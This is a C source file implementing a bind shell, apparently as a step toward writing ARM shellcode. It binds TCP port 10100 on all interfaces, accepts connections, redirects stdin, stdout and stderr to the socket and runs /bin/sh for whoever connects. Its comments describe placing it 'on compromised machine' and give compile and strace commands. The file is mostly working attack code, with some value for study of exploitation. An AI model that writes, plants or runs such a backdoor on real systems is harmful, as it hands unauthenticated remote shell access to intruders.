/*

Author: Abhinav Thakur
File:   bind_shell.c
Compile:        $ gcc -g bind_shell.c -o ./bind_shell.elf
Run            :$ ./bind_shell.elf

# Use -X raw option to see what values (rather than symbols) are passed to syscalls.
# This is useful to identify MACRO values pertaining to syscall parameters while writing SHELLCODE
$ strace -X raw \
	-e socket,bind,setsockopt,listen,accept,dup2,execve \
	qemu-arm-static -L /usr/arm-linux-gnueabi ./bind_shell.elf

NOTE: For internet programming, refer to $ man 7 ip


socket(2) + bind(2)/setsockopt(2) + listen(2) + accept(2) + dup2(2) + execve(2)

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netinet/ip.h>		/* superset of netinet/in.h, see ip(7) */
#include <arpa/inet.h>		/* convert values between host & network byte order */

#define MAX_CLIENTS 7 
//#define PORT 19999
#define PORT 10100

int main ()
{
	/* create an internet socket (man 7 ip) */
	int hostSfd = socket (PF_INET, SOCK_STREAM, 0);

	/* initialize address structure to be bound to created socket */
	struct sockaddr_in hostAddr;
	hostAddr.sin_family = AF_INET;
	hostAddr.sin_port = htons(PORT);
	hostAddr.sin_addr.s_addr = 0;		// 0.0.0.0
	//hostAddr.sin_addr.s_addr = htonl(INADDR_ANY);		// 0.0.0.0
	//hostAddr.sin_addr.s_addr = htonl(0x7f000001);		// 127.0.0.1
	//hostAddr.sin_addr.s_addr = htonl(0xc0a8018d);		// 192.168.1.141


	/* On compromised machine, bind the socket to a port (network interface+port) */
	while (bind (hostSfd, (struct sockaddr *)&hostAddr, sizeof(hostAddr)) < 0){
		/*
			in case bind(2) fails -
			A connection will hold a TCP port in TIME_WAIT state for about 30-120 seconds after
			getting TERMINATED. This may be one of the reasons why a bind(2) call may fail.
			see netcat output below -
			tcp        0      0 127.0.0.1:19999         127.0.0.1:55910         TIME_WAIT   -	


		*/
		printf ("bind failed, now forcing to bind on PORT\n");
		setsockopt(hostSfd, SOL_SOCKET, SO_REUSEADDR, 0, 0);
		setsockopt(hostSfd, SOL_SOCKET, SO_REUSEPORT, 0, 0);
		sleep(1);
	}

	printf ("bind succeeds\n");

	/* start listening for incomming connections : upto MAX_CLIENTS */
	listen (hostSfd, MAX_CLIENTS);

	/* accept connection and return a shell to whoever connects */ 
	int evilfd = -1;
	while ((evilfd = accept(hostSfd, 0, 0)) > 0){
		// redirecting STDIN, STDOUT, STDERR to evilfd
		for (int i = 0; i < 3; ++i)
			dup2 (evilfd, i);

		// spawn a shell 
		execve("/bin/sh", 0, 0);
		close (evilfd);
	}

	return 0;
}
